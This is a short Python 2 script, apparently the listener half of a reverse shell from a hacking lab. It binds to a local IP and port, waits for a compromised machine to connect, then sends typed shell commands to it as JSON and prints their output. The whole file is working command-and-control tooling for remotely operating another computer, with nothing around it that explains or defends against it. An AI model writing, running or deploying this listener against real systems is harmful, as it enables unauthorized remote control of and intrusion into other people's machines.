#!/usr/bin/python

import socket
import json

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = raw_input("Shell#~%s: "%str(ip))
        reliable_send(command)
        if command == 'q':
            break
        else:
            result = reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("10.0.2.15",54321))#Change to your IP
    s.listen(5)

    print("[+] Listening for incoming connections")
    target, ip = s.accept()
    print("[+] Connection established From: %s" % str(ip))

server()
shell()
s.close()
